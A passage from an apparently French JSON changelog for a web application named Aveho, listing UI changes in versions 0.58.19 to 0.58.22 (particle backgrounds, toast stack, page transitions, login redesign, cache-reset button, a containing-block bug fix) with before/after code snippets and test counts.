          "after": "// 0.58.22 - Particles avec couleur déduite du variant\nimport ParticlesBackground from './ParticlesBackground';\n\nconst VARIANTS = {\n  teal:   { ..., particleColor: 'rgba(124, 200, 200, 0.55)' },\n  blue:   { ..., particleColor: 'rgba(124, 200, 200, 0.55)' },\n  violet: { ..., particleColor: 'rgba(122, 111, 176, 0.65)' },\n  terra:  { ..., particleColor: 'rgba(201, 134, 127, 0.55)' },\n  amber:  { ..., particleColor: 'rgba(239, 159, 39, 0.55)' },\n  navy:   { ..., particleColor: 'rgba(124, 200, 200, 0.55)' },\n};\n\nexport default function PageHero({\n  particles = false,         // NEW\n  particlesCount = 20,        // NEW\n  // ...\n}) {\n  return (\n    <header>\n      {particles && (\n        <div style={{ position: 'absolute', inset: 0, opacity: 0.7 }}>\n          <ParticlesBackground\n            count={particlesCount}\n            color={cfg.particleColor}\n            lineColor={cfg.particleColor.replace(/[\\d.]+\\)$/, '0.15)')}\n            showOnMobile={false}\n          />\n        </div>\n      )}\n      {/* ... */}\n    </header>\n  );\n}\n\n// Usage :\n<PageHero variant='violet' particles title='Statistiques' />\n<PageHero variant='terra' particles particlesCount={30} title='Patients' />"
        }
      },
      { "code": "UI", "txt": "🍞 TOAST PREMIUM STACK — refonte complète du helper Toast. (a) **MAX 4 toasts simultanés** : `trimContainer()` éjecte les plus anciens si on dépasse. (b) **Progress bar** : ligne fine en bas qui se vide pendant la `duration` via @keyframes av-toast-progress (transform:scaleX de 1 à 0). (c) **Layered shadows premium** : 4 couches (shadow lift + shadow ground + inset white highlight + glow par couleur 24px). (d) **Backdrop-filter blur(20px) saturate(180%)** sur fond rgba blanc 92%. (e) **Icon glow** : box-shadow autour de l'icône avec la couleur du type. (f) **Hover pause** : auto-dismiss s'arrête au hover (mouseenter clear timeout + animation paused), repart au mouseleave. (g) **Glow par type** : success vert, info bleu, warning amber, error rouge — chacun a son `glow:` dans TOAST_TYPES",
        "code_snippet": {
          "file": "app/components/ui-premium/Toast.js + app/globals.css",
          "note": "Toast premium stack",
          "lang": "jsx",
          "before": "// AVANT 0.58.22\nconst TOAST_TYPES = {\n  success: { color: '#5aa05a', bg: '#eef9ef', icon: 'ti-circle-check' },\n  // ...\n};\n\nObject.assign(toast.style, {\n  background: '#fff',\n  boxShadow: '0 10px 25px rgba(20,33,49,.15), 0 4px 8px rgba(20,33,49,.08)',\n  // pas de progress bar, pas de hover pause, illimité\n});\n\nsetTimeout(() => removeToast(toast), duration);  // pas pausable",
          "after": "// 0.58.22 - Stack premium\nconst MAX_TOASTS = 4;\n\nconst TOAST_TYPES = {\n  success: {\n    color: '#5aa05a', bg: '#eef9ef',\n    icon: 'ti-circle-check',\n    glow: 'rgba(90,160,90,.35)',   // NEW\n  },\n  // ...\n};\n\nfunction trimContainer(container) {\n  const children = Array.from(container.children);\n  if (children.length > MAX_TOASTS) {\n    children.slice(0, children.length - MAX_TOASTS).forEach(removeToast);\n  }\n}\n\n// Layered shadows + backdrop blur\nObject.assign(toast.style, {\n  background: 'rgba(255, 255, 255, 0.92)',\n  backdropFilter: 'blur(20px) saturate(180%)',\n  boxShadow: `\n    0 10px 25px rgba(20, 33, 49, 0.18),\n    0 4px 8px rgba(20, 33, 49, 0.10),\n    0 0 0 1px rgba(255, 255, 255, 0.5) inset,\n    0 0 24px ${cfg.glow}\n  `,\n});\n\n// Progress bar dans template HTML\n${duration > 0 ? `\n  <div data-toast-progress style='\n    position:absolute; bottom:0; left:0; right:0;\n    height:3px; background:${cfg.color};\n    transform-origin:left center;\n    animation: av-toast-progress ${duration}ms linear forwards;\n  '></div>\n` : ''}\n\n// Hover pause\ntoast.addEventListener('mouseenter', () => {\n  clearTimeout(dismissTimer);\n  progressEl.style.animationPlayState = 'paused';\n});\n\n/* CSS */\n@keyframes av-toast-progress {\n  from { transform: scaleX(1); }\n  to   { transform: scaleX(0); }\n}"
        }
      },
      { "code": "UI", "txt": "🎬 PAGE TRANSITIONS SLIDE-IN DIRECTION-AWARE. Refonte de PageTransition.js. (a) **State direction** (`forward` | `back`). (b) **History stack** géré via useRef : à chaque pathname change, vérifie si l'URL était déjà visitée → `back`. Sinon → `forward`. (c) **2 animations différentes** : `av-page-slide-in-right` (translateX 20px → 0 = vient de droite) pour forward, `av-page-slide-in-left` (translateX -20px → 0 = vient de gauche) pour back. (d) Toujours sans `willChange` (containing block bug). (e) Durée 320ms cubic-bezier(.2, .8, .2, 1)",
        "code_snippet": {
          "file": "app/components/PageTransition.js + globals.css",
          "note": "Slide direction-aware",
          "lang": "jsx",
          "before": "// AVANT 0.58.22 - fade simple\nuseEffect(() => {\n  setAnimKey(pathname);\n  setDisplayed(children);\n}, [pathname, children]);\n\nreturn (\n  <div\n    key={animKey}\n    style={{ animation: 'av-page-enter 280ms ...' }}\n  >\n    {displayed}\n  </div>\n);",
          "after": "// 0.58.22 - Slide direction-aware\nconst [direction, setDirection] = useState('forward');\nconst historyStackRef = useRef([pathname]);\n\nuseEffect(() => {\n  const stack = historyStackRef.current;\n  const previousIndex = stack.lastIndexOf(pathname);\n  let dir = 'forward';\n  if (previousIndex >= 0 && previousIndex < stack.length - 1) {\n    dir = 'back';\n    historyStackRef.current = stack.slice(0, previousIndex + 1);\n  } else {\n    historyStackRef.current = [...stack, pathname];\n  }\n  setDirection(dir);\n  setAnimKey(pathname);\n  setDisplayed(children);\n}, [pathname, children]);\n\nconst animName = direction === 'back' ? 'av-page-slide-in-left' : 'av-page-slide-in-right';\n\nreturn (\n  <div key={animKey} style={{ animation: `${animName} 320ms cubic-bezier(.2,.8,.2,1)` }}>\n    {displayed}\n  </div>\n);\n\n/* CSS */\n@keyframes av-page-slide-in-right {\n  from { opacity: 0; transform: translateX(20px); }\n  to   { opacity: 1; transform: translateX(0); }\n}\n@keyframes av-page-slide-in-left {\n  from { opacity: 0; transform: translateX(-20px); }\n  to   { opacity: 1; transform: translateX(0); }\n}"
        }
      },
      { "code": "UI", "txt": "💀 DRAWER SKELETON PREMIUM. (a) Nouvelle prop **`loading`** sur Drawer premium (false par défaut). (b) Quand loading=true, le body affiche automatiquement **<DrawerSkeleton />** au lieu des children. (c) Skeleton structuré : header (titre 55% + sous-titre 75%) → 2 sections (label + 2 lignes) → grid 2x2 mini cards → paragraph 4 lignes dégressives. (d) Animation **av-skel-shimmer** : gradient horizontal 200% qui bouge en 1.4s ease-in-out infinite. (e) Animation fade-in 0.3s à l'apparition. (f) CSS .av-skel-line réutilisable",
        "code_snippet": {
          "file": "app/components/ui-premium/Drawer.js + globals.css",
          "note": "Skeleton automatique loading",
          "lang": "jsx",
          "before": "// AVANT 0.58.22\nexport default function Drawer({ open, children, ... }) {\n  return (\n    <div>\n      {/* ... */}\n      <div className='body'>\n        {children}  {/* l'user doit gérer son propre skeleton */}\n      </div>\n    </div>\n  );\n}",
          "after": "// 0.58.22 - Prop loading + DrawerSkeleton auto\nexport default function Drawer({\n  open, children, loading = false, ...\n}) {\n  return (\n    <div>\n      {/* ... */}\n      <div className='body'>\n        {loading ? <DrawerSkeleton /> : children}\n      </div>\n    </div>\n  );\n}\n\nfunction DrawerSkeleton() {\n  return (\n    <div className='av-drawer-skel'>\n      {/* Header : titre + sous-titre */}\n      <div className='av-skel-line' style={{ width: '55%', height: 22 }} />\n      <div className='av-skel-line' style={{ width: '75%', height: 14 }} />\n\n      {/* 2 sections (label + 2 lignes) */}\n      {[0, 1].map(i => (\n        <div key={i}>\n          <div className='av-skel-line' style={{ width: 100, height: 11 }} />\n          <div className='av-skel-line' style={{ width: '100%', height: 16 }} />\n          <div className='av-skel-line' style={{ width: '78%', height: 16 }} />\n        </div>\n      ))}\n\n      {/* Grid 2x2 mini cards */}\n      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>\n        {[0,1,2,3].map(i => <SkelCard key={i} />)}\n      </div>\n\n      {/* Paragraph 4 lignes */}\n      {[100, 92, 85, 68].map(w => (\n        <div className='av-skel-line' style={{ width: `${w}%`, height: 12 }} />\n      ))}\n    </div>\n  );\n}\n\n/* CSS shimmer */\n.av-skel-line {\n  background: linear-gradient(90deg, #eef2f5 0%, #e3e9ee 50%, #eef2f5 100%);\n  background-size: 200% 100%;\n  border-radius: 6px;\n  animation: av-skel-shimmer 1.4s ease-in-out infinite;\n}\n@keyframes av-skel-shimmer {\n  0%   { background-position: 200% 0; }\n  100% { background-position: -200% 0; }\n}\n\n// Usage :\n<Drawer open={open} loading={loading} title='Détail patient'>\n  {/* contenu réel quand loading=false */}\n  <PatientDetails ... />\n</Drawer>"
        }
      },
      { "code": "AI", "txt": "+27 tests Vitest (v058-22-bundle-wow.test.js) : version+SW (2), ConicCard /accueil (3 — import + DI aurora + Achats amber), Migration NeonButton (4 — 4 pages avec leurs imports + boutons spécifiques), PageHero particles (4 — import + props + VARIANTS particleColor + render conditionnel), Toast stack (6 — MAX 4 + glow par type + layered shadows + backdrop-blur + progress + hover pause + keyframe), PageTransition slide (4 — direction state + history stack + 2 animations + keyframes), Drawer Skeleton (5 — prop loading + render conditionnel + DrawerSkeleton défini + structure + CSS shimmer). +1 ajustement ancien test 0.58.10 (av-page-enter remplacé par av-page-slide-in-*). Total 3953 verts (+28 nets)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.22 : 6 chantiers WOW livrés en bundle. ConicCard intégré sur les 2 KPIs phares de /accueil (effet spotlight permanent). Migration NeonButton sur 4 pages clés avec 6 boutons (variants par couleur métier : bleu interventions, ambre achats, violet transferts, teal signalements). PageHero peut désormais embarquer des particules canvas variant-aware. Toast premium stack avec progress bar et hover pause — UX considérablement améliorée pour les notifications. Page transitions direction-aware. Drawer Skeleton automatique pour les états de chargement. PROCHAINES PISTES POSSIBLES : (a) Migration NeonButton sur /patients, /materiel, /commandes, /utilisateurs. (b) Application ConicCard sur d'autres KPI critiques. (c) PageHero particles activé sur /statistiques, /accueil, /patients. (d) BulkToolbar premium amélioré avec actions groupées. (e) Onboarding visuel pour les nouveaux utilisateurs (Driver.js). (f) Mode 'présentation' pour démos clients (zoom + animations slow)" }
    ],
    "themes": ["ui", "wow", "design-system", "ux"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.22.html",
    "sqlFile": null
  },
  {
    "v": "0.58.21",
    "kind": "version",
    "titre": "🚀 LOGIN REDESIGN HITECH + Cmd+K palette glass premium + NeonButton variant aurora",
    "chantiers": [
      { "code": "UI", "txt": "🎨 PAGE CONNEXION REDESIGNÉE FULLSCREEN AURORA — refonte complète de /login. (a) Background **radial-gradient sombre** (#244a55 → #050a14) au lieu de l'ancienne carte 2 colonnes sur fond clair. (b) **3 Aurora blobs animés** flottants (teal/blue/violet) avec filter:blur(80px) et animation 18s. (c) **ParticlesBackground** (45 particules teal avec connexions) en background actif sur mobile aussi. (d) **Grid cyber subtil** en overlay avec mask radial. (e) **Logo géant 56px** centré avec .v en glow teal 4-layer + animation float. (f) **Card glassmorphism centrale** : backdrop-filter blur(30px) saturate(180%) + border conic-gradient scan permanent rotation 8s. (g) **NeonButton géant** size=lg fullWidth variant=**aurora** (multi-couleur Aveho teal→blue→violet→terra) pour 'Se connecter'. (h) **Inputs glass** avec focus ring teal et icon préfixe. (i) **Footer features** avec chips arrondis (Multi-établissements · Biométrie · HDS · Plan établissement). (j) **Animations entrée** fade+slide-up séquentielles. (k) Mobile-first responsive avec safe-area-inset-bottom",
        "code_snippet": {
          "file": "app/login/page.js + app/globals.css",
          "note": "Login hitech fullscreen",
          "lang": "jsx",
          "before": "// AVANT 0.58.21 - login carte 2 colonnes sur fond gris\n<div className='bg-dark login-wrap'>\n  <div className='login-card'>\n    <div className='login-left'>\n      <div className='presente'>AVEHO PRÉSENTE</div>\n      <div className='logo'>a<span className='v'>v</span>eho</div>\n      ...\n    </div>\n    <div className='login-right'>\n      <h1>Bienvenue 👋</h1>\n      <input className='input' type='email' />\n      <input className='input' type='password' />\n      <button className='btn-primary'>Se connecter</button>\n    </div>\n  </div>\n</div>",
          "after": "// 0.58.21 - login hitech fullscreen aurora\n<div className='av-login-root'>\n  {/* Particules teal */}\n  <div className='av-login-particles'>\n    <ParticlesBackground count={45} showOnMobile={true} />\n  </div>\n\n  {/* 3 Aurora blobs */}\n  <div className='av-login-aurora'>\n    <div className='av-login-blob blob-teal' />\n    <div className='av-login-blob blob-blue' />\n    <div className='av-login-blob blob-violet' />\n  </div>\n\n  {/* Grid cyber overlay */}\n  <div className='av-login-grid' />\n\n  <div className='av-login-container'>\n    <div className='av-login-brand'>\n      <div className='av-login-logo'>a<span className='av-login-v'>v</span>eho</div>\n    </div>\n\n    <div className='av-login-card'>\n      <div className='av-login-card-scan' />  {/* scan conic permanent */}\n      <div className='av-login-card-inner'>\n        <h1>Bienvenue <span className='wave'>👋</span></h1>\n\n        <input className='av-login-input' type='email' />\n        <input className='av-login-input' type='password' />\n\n        <NeonButton\n          variant='aurora'    // multi-couleur Aveho\n          size='lg'\n          fullWidth\n          icon='ti-login'\n        >\n          Se connecter\n        </NeonButton>\n      </div>\n    </div>\n  </div>\n</div>"
        }
      },
      { "code": "UI", "txt": "💎 NEONBUTTON ENRICHI : variant **aurora** multi-couleur + prop **icon**. (a) Nouveau variant `aurora` : gradient 4-stop teal→blue→violet→terra (les 4 couleurs Aveho) avec glow combiné 100px. Le bouton 'Se connecter' du login l'utilise en taille lg fullWidth. (b) Prop `icon='ti-...'` qui préfixe le label avec une icône Tabler. Spinner intégré pour `icon='ti-loader-2'` via @keyframes av-neon-spin. (c) Total variants NeonButton : **7** (teal/blue/violet/terra/amber/navy/aurora)",
        "code_snippet": {
          "file": "app/components/ui-premium/NeonButton.js",
          "note": "Variant aurora + icon",
          "lang": "jsx",
          "before": "// AVANT 0.58.21 - 6 variants, pas de prop icon\nconst VARIANTS = {\n  teal: {...}, blue: {...}, violet: {...},\n  terra: {...}, amber: {...}, navy: {...},\n};",
          "after": "// 0.58.21 - 7 variants dont aurora multi-couleur\nconst VARIANTS = {\n  teal: {...}, blue: {...}, violet: {...},\n  terra: {...}, amber: {...}, navy: {...},\n  aurora: {  // NEW\n    grad: 'linear-gradient(135deg, #7CC8C8 0%, #185FA5 35%, #7a6fb0 70%, #C9867F 100%)',\n    glow: '0 0 0 4px rgba(124,200,200,.18), 0 12px 32px rgba(24,95,165,.35), 0 0 60px rgba(124,200,200,.30), 0 0 100px rgba(122,111,176,.18)',\n    color: '#7CC8C8',\n    textColor: '#fff',\n  },\n};\n\n// + Prop icon\nexport default function NeonButton({ children, icon, ... }) {\n  return (\n    <button>\n      <span>\n        {icon && <i className={`ti ${icon}`} />}\n        {children}\n      </span>\n    </button>\n  );\n}\n\n// Usage :\n<NeonButton variant='aurora' size='lg' fullWidth icon='ti-login'>\n  Se connecter\n</NeonButton>"
        }
      },
      { "code": "UI", "txt": "⌨ CMD+K PALETTE REFONTE GLASS PREMIUM (refonte GlobalSearch.js). (a) **Rendu via Portal** vers document.body (échappe aux containing blocks d'ancêtres comme PageTransition). (b) **Overlay** avec backdrop-filter blur(10px) saturate(140%) au lieu de fond opaque. (c) **Modal** glassmorphism dark : rgba navy 95% + backdrop-filter blur(30px) saturate(180%) + border 1px teal + shadow x3 (32px + 1px inset + 60px teal glow). (d) **Border conic-gradient scan permanent** rotation 5s. (e) **Animation entrée** scale-in + fade en 320ms cubic-bezier. (f) **Header search** avec icon teal qui glow + input transparent. (g) **Chips filtres** redesignés avec hover lift + transition. (h) **Footer kbds** mini avec couleurs teal. (i) **Theme dark** uniforme avec overrides CSS pour les couleurs sombres internes du body. (j) Mobile responsive @600px",
        "code_snippet": {
          "file": "app/GlobalSearch.js + app/globals.css",
          "note": "Cmd+K palette dark glass",
          "lang": "jsx",
          "before": "// AVANT 0.58.21 - palette blanche basique\n<div style={{\n  position: 'fixed', inset: 0,\n  background: 'rgba(20,33,49,.7)',\n  zIndex: 9998,\n}}>\n  <div style={{\n    background: '#fff', borderRadius: 14,\n    width: '90%', maxWidth: 640,\n    boxShadow: '0 30px 80px rgba(0,0,0,.4)',\n  }}>\n    <input style={{ color: '#142131' }} />\n    {/* ... */}\n  </div>\n</div>",
          "after": "// 0.58.21 - Portal + glassmorphism dark premium\nimport { createPortal } from 'react-dom';\n\nconst [mounted, setMounted] = useState(false);\nuseEffect(() => { setMounted(true); }, []);\n\nif (!open || !mounted) return null;\n\nreturn createPortal(\n  <div className='av-cmdk-overlay'>\n    <div className='av-cmdk-modal'>\n      <div className='av-cmdk-scan' />  {/* conic permanent */}\n      <div className='av-cmdk-inner'>\n        <i className='ti ti-search av-cmdk-icon' />\n        <input className='av-cmdk-input' />\n        <kbd className='av-cmdk-kbd'>Échap</kbd>\n        {/* chips, results, footer kbds... */}\n      </div>\n    </div>\n  </div>,\n  document.body\n);\n\n/* CSS associé :\n.av-cmdk-overlay { backdrop-filter: blur(10px) saturate(140%); }\n.av-cmdk-modal { backdrop-filter: blur(30px) saturate(180%); }\n.av-cmdk-scan { animation: av-cmdk-scan-rotate 5s linear infinite; }\n.av-cmdk-icon { color: #7CC8C8; text-shadow: 0 0 8px rgba(124,200,200,.7); }\n*/"
        }
      },
      { "code": "UI", "txt": "🔄 MIGRATION NEONBUTTON SUR /profil — 3 boutons clés passent de Btn legacy à NeonButton premium. (a) **'Enregistrer'** (saveNom) → NeonButton variant=teal icon=ti-device-floppy. (b) **'Modifier le mot de passe'** (savePwd) → NeonButton variant=blue icon=ti-lock. (c) **CacheResetButton** ('Vider le cache et recharger') → NeonButton variant=amber icon=ti-refresh. Quand on confirme : variant=teal icon=ti-check. Quand busy : variant=terra icon=ti-loader-2 (spin auto)",
        "code_snippet": {
          "file": "app/profil/page.js",
          "note": "Migration NeonButton",
          "lang": "jsx",
          "before": "// AVANT 0.58.21\nimport { PageHero, Tabs, Avatar, KpiCard } from '../components/ui-premium';\n\n<Btn variant='primary' icon='ti-device-floppy' onClick={saveNom}>\n  Enregistrer\n</Btn>\n\n<button style={{\n  background: 'linear-gradient(135deg, #EF9F27, #d6831d)',\n  color: '#fff', padding: '10px 18px', /* ... */\n}}>\n  <i className='ti ti-refresh' /> Vider le cache\n</button>",
          "after": "// 0.58.21\nimport { PageHero, Tabs, Avatar, KpiCard, NeonButton } from '../components/ui-premium';\n\n<NeonButton variant='teal' icon='ti-device-floppy' onClick={saveNom}>\n  Enregistrer\n</NeonButton>\n\n<NeonButton variant='amber' icon='ti-refresh' onClick={() => setConfirming(true)}>\n  Vider le cache et recharger\n</NeonButton>\n\n<NeonButton\n  variant={busy ? 'terra' : 'teal'}\n  icon={busy ? 'ti-loader-2' : 'ti-check'}\n  onClick={handleReset}\n>\n  {busy ? 'Nettoyage en cours…' : 'Confirmer : vider et recharger'}\n</NeonButton>"
        }
      },
      { "code": "AI", "txt": "+38 tests Vitest (v058-21-login-cmdk-neon.test.js) : version+SW (2), NeonButton aurora+icon (3 — variant aurora 4 couleurs + icon prop + ti-loader-2 spin), Login redesign (9 — imports + .av-login-root + ParticlesBackground 45 + 3 blobs + card scan + NeonButton lg aurora fullWidth + magic-link + footer chips + mobile safe-area), Login CSS (7 — root radial + 3 blobs animations + grid mask + card backdrop-filter + scan conic + wave keyframes + media 600px), Cmd+K refonte (7 — createPortal + Portal mounted + .av-cmdk-overlay + .av-cmdk-modal scan + .av-cmdk-input glow + chips + kbd-mini), Cmd+K CSS (5 — overlay blur + modal scale-in + scan rotate + icon glow + mobile responsive), Migration NeonButton profil (4 — import + saveNom teal + savePwd blue + CacheReset amber), Fix seuil versions-index (1). +1 ajustement test versions-index (500→650 KB). Total 3925 verts (+38 nets)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.21 : NeonButton porté à **7 variants** (ajout aurora multi-couleur). Page connexion totalement repensée hitech fullscreen avec aurora + particules + glassmorphism + scan conic + animations séquentielles — un wow IMMÉDIAT au lancement de l'app. Cmd+K palette en dark glass premium avec Portal robuste. Migration NeonButton commencée sur /profil — à étendre progressivement sur /interventions, /achats, /transferts, /signalements. PROCHAINES PISTES : (a) Application ConicCard sur /accueil pour 1-2 KPIs phares. (b) Migration NeonButton sur les autres pages clés. (c) ParticlesBackground variants couleur dans PageHero. (d) Toast premium amélioré avec stack. (e) Page transitions slide-in entre routes. (f) Skeleton premium dans les Drawers de détail" }
    ],
    "themes": ["ui", "design-system", "wow"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.21.html",
    "sqlFile": null
  },
  {
    "v": "0.58.20",
    "kind": "version",
    "titre": "🔄 BUNDLE : Bouton 'Vider le cache' + ConicCard + ParticlesBackground sur /accueil",
    "chantiers": [
      { "code": "UI", "txt": "🔄 LIB CACHERESET + BOUTON 'VIDER LE CACHE' dans /profil. Pour résoudre les bugs où la nouvelle UI ne s'affiche pas après une maj (cache navigateur ou SW qui sert encore les anciens chunks). (a) Nouveau module **lib/cacheReset.js** avec 5 fonctions : `unregisterAllServiceWorkers()` (désinscrit tous les SW), `clearAllCaches()` (vide la CacheStorage API), `clearLocalStorageExceptAuth()` (préserve les clés sb-* Supabase pour ne pas déconnecter l'user), `clearSessionStorage()`, et `fullCacheReset({reload, keepAuth})` qui orchestre tout + reload avec cache-busting (`?_cache_reset=timestamp`). (b) Panneau **'Problème d'affichage ?'** dans l'onglet Sécurité du profil avec bouton 'Vider le cache et recharger' (style amber). Confirmation à 2 étapes (clic → confirme) pour éviter les accidents. (c) Préserve la session : l'user n'a PAS besoin de se reconnecter après le reset",
        "code_snippet": {
          "file": "lib/cacheReset.js + app/profil/page.js",
          "note": "Factory reset front",
          "lang": "jsx",
          "before": "// AVANT 0.58.20 - aucun moyen UI de vider le cache\n// L'utilisateur devait :\n// 1. Ouvrir DevTools (F12)\n// 2. Application → Service Workers → Unregister\n// 3. Storage → Clear site data\n// 4. Ctrl+Shift+R\n// → trop technique pour la plupart des users",
          "after": "// 0.58.20 - Bouton dans /profil onglet Sécurité\nimport { fullCacheReset } from '../../lib/cacheReset';\n\n<Panel style={{ borderLeft: '4px solid #EF9F27' }}>\n  <h2>Problème d'affichage ?</h2>\n  <CacheResetButton />\n</Panel>\n\n// Au clic :\nawait fullCacheReset({\n  reload: true,        // reload après clear\n  keepAuth: true,      // préserve session Supabase (sb-* clés)\n});\n\n// Procédure :\n// 1. Désinscrit tous les SW (navigator.serviceWorker.getRegistrations)\n// 2. Vide CacheStorage (caches.keys() + caches.delete())\n// 3. Vide localStorage SAUF sb-*\n// 4. Vide sessionStorage\n// 5. Reload avec ?_cache_reset=timestamp pour cache-buster"
        }
      },
      { "code": "UI", "txt": "💫 NOUVEAU COMPOSANT CONICCARD (app/components/ui-premium/ConicCard.js, 200 lignes). Alternative premium à KpiCard avec une **bordure conic-gradient qui tourne en permanence** (effet 'scanner' hitech), au lieu du tilt 3D. (a) 6 variants : teal, blue, violet, terra, amber, **aurora** (multi-couleur 4 couleurs Aveho qui tournent). (b) 3 vitesses : slow (12s), normal (4s), fast (2s). (c) 3 sizes : sm, md, lg. (d) Conic-gradient avec mask-composite:exclude → ne peint QUE la bordure (border-only). (e) Decorative glow blob arrière. (f) Hover lift -3px + glow renforcé. Idéal pour mettre en valeur 1 ou 2 KPIs phares (mode 'spotlight') au lieu d'animer toutes les cards comme KpiCard fait",
        "code_snippet": {
          "file": "app/components/ui-premium/ConicCard.js (NEW)",
          "note": "Card avec scan-line permanent",
          "lang": "jsx",
          "before": "// Pour mettre en valeur un KPI phare, KpiCard ne tilte qu'au hover\n<KpiCard icon='ti-tools' label='Interventions' value={142} />\n// → discret tant qu'on hover pas",
          "after": "// 0.58.20 - ConicCard pour spotlight permanent\nimport { ConicCard } from '@/components/ui-premium';\n\n<ConicCard\n  icon='ti-tools'\n  label='Interventions ouvertes'\n  value={142}\n  sub='↑ +12% vs mois dernier'\n  variant='aurora'    // multi-couleur Aveho\n  speed='normal'      // 4s pour le scan\n  onClick={() => router.push('/interventions')}\n/>\n\n// La bordure conic-gradient tourne en continu — attire l'œil\n// même sans interaction. Parfait pour le KPI 'star' de la page."
        }
      },
      { "code": "UI", "txt": "✨ COMPOSANT PARTICLESBACKGROUND (app/components/ui-premium/ParticlesBackground.js, 150 lignes). Canvas léger qui dessine ~30 particules teal flottantes avec connexions automatiques entre particules proches (effet **constellation hitech**). (a) Canvas full-size, requestAnimationFrame loop. (b) Particules avec vitesse aléatoire, rebondissent sur les bords. (c) Connexions linéaires entre particules à moins de 140px (lineDistance configurable). (d) Opacité des lignes proportionnelle à la distance. (e) **Optimisations** : respect `prefers-reduced-motion` (skip animation), pause si tab non visible (visibilitychange), skip mobile par défaut pour économiser batterie (showOnMobile=false). (f) Cleanup propre au unmount. Branché sur **/accueil** : rendu en `position: fixed` en background derrière tout le contenu (zIndex 0, pointer-events: none)",
        "code_snippet": {
          "file": "app/components/ui-premium/ParticlesBackground.js (NEW) + app/accueil/page.js",
          "note": "Constellation teal en arrière-plan",
          "lang": "jsx",
          "before": "// AVANT 0.58.20 - bg-dark statique\n<div className='bg-dark'>\n  <TopBar />\n  <div className='wrap'>\n    {/* contenu */}\n  </div>\n</div>",
          "after": "// 0.58.20 - particules canvas en background\nimport { ParticlesBackground } from '../components/ui-premium';\n\n<div className='bg-dark' style={{ position: 'relative', isolation: 'isolate' }}>\n  {/* Canvas particules en fond */}\n  <div style={{ position: 'fixed', inset: 0, zIndex: 0, pointerEvents: 'none' }}>\n    <ParticlesBackground count={30} speed={0.3} linkDistance={140} />\n  </div>\n  <TopBar />\n  <div className='wrap' style={{ position: 'relative', zIndex: 1 }}>\n    {/* contenu au-dessus */}\n  </div>\n</div>\n\n// Le canvas :\n// - 30 particules teal qui flottent\n// - Connexions entre particules proches (constellation)\n// - 60fps via requestAnimationFrame\n// - Pause si tab non visible\n// - Skip sur mobile (économie batterie)\n// - Respect prefers-reduced-motion"
        }
      },
      { "code": "AI", "txt": "+35 tests Vitest (v058-20-cache-reset-bundle.test.js) : version+SW (2), lib/cacheReset (6 — use client + 5 exports + helpers SW/Caches/LS/SS + cache-busting reload + options), /profil bouton (6 — import + Panel + composant CacheResetButton + 2-step confirm + fullCacheReset options + loader state), ConicCard (7 — use client + 6 variants + aurora multi-color + 3 speeds + mask exclusion + animation perm + sizes + export), ParticlesBackground (9 — use client + props + canvas RAF + prefers-reduced + skip mobile + pause visibilitychange + connections + cleanup + export), /accueil intégration (3 — import + Particles fixed + wrap zIndex 1), Récap 24 composants (1). Total 3887 verts (+35)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.20 : 24 composants premium (ajout ConicCard + ParticlesBackground). Le bouton 'Vider le cache' dans /profil permet à n'importe quel utilisateur non technique de résoudre les bugs de cache navigateur en 2 clics, sans avoir besoin de DevTools. Les particules sur /accueil ajoutent une ambiance hitech subtile et performante (canvas optimisé, skip mobile). Le ConicCard offre une alternative wow pour mettre en valeur des KPIs phares. Prochaines pistes : (a) **Cmd+K palette** refonte glass premium (refonte de GlobalSearch). (b) **Page connexion redesignée** fullscreen avec NeonButton géant. (c) **Migration progressive** btn-save/btn-mini → NeonButton sur les pages clés. (d) Application de ConicCard sur /accueil pour 1-2 KPIs phares" }
    ],
    "themes": ["ui", "design-system", "ux"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.20.html",
    "sqlFile": null
  },
  {
    "v": "0.58.19",
    "kind": "version",
    "titre": "📱 MOBILE FIX CRITIQUE : Menu burger + popups + drawers invisibles en bas de page (containing block PageTransition)",
    "chantiers": [
      { "code": "BG", "txt": "🐛 BUG ROOT CAUSE — Menu burger et popups invisibles quand l'user était scrollé en bas de page sur mobile. CAUSE : Le composant `PageTransition` (qui wrap TOUTE l'app dans layout.js) avait `willChange: 'opacity, transform'` — propriété qui crée un **containing block** pour les enfants `position: fixed`. Conséquence : le menu-drawer, les modales, les drawers premium n'étaient PAS positionnés relativement au viewport mais relativement à PageTransition (qui reste fixe en haut). Quand l'user scrollait en bas, les overlays restaient logés en haut de la page (hors écran). FIX : `willChange` retiré de PageTransition. L'animation 280ms reste fluide sans cette hint",
        "code_snippet": {
          "file": "app/components/PageTransition.js",
          "note": "Root cause : containing block",
          "lang": "jsx",
          "before": "// AVANT 0.58.19 - willChange créait un containing block GLOBAL\nreturn (\n  <div\n    key={animKey}\n    style={{\n      animation: 'av-page-enter 280ms cubic-bezier(.2, .8, .2, 1)',\n      willChange: 'opacity, transform',  // ← crée containing block !\n    }}\n  >\n    {displayed}\n  </div>\n);\n// → TOUS les enfants position:fixed (menu, modales, drawers) sont\n//   relatifs à ce <div>, PAS au viewport.\n// → Invisibles quand l'user scroll en bas de page sur mobile",
          "after": "// 0.58.19 - retrait du willChange\nreturn (\n  <div\n    key={animKey}\n    style={{\n      animation: 'av-page-enter 280ms cubic-bezier(.2, .8, .2, 1)',\n      // willChange retiré : créait un containing block sur le wrapper full-app\n      // qui cassait position:fixed pour tous les overlays enfants\n    }}\n  >\n    {displayed}\n  </div>\n);"
        }
      },
      { "code": "BG", "txt": "🐛 BUG SECONDAIRE — KpiCard avait `transformStyle: preserve-3d` + `willChange: transform` qui créaient AUSSI des containing blocks pour les pages avec beaucoup de KPI (statistiques, accueil). Les drawers ouverts depuis un onClick sur KpiCard restaient bloqués au-dessus de la card. FIX : transformStyle et willChange retirés. Le tilt 3D fonctionne pareil via `perspective(1000px)` directement dans le transform inline (chaque tilt crée sa propre matrice 3D au moment du hover)",
        "code_snippet": {
          "file": "app/components/ui-premium/KpiCard.js",
          "note": "Tilt 3D sans containing block permanent",
          "lang": "jsx",
          "before": "// AVANT 0.58.19\nstyle={{\n  ...\n  transformStyle: 'preserve-3d',     // ← containing block !\n  willChange: onClick ? 'transform' : 'auto',  // ← containing block !\n}}",
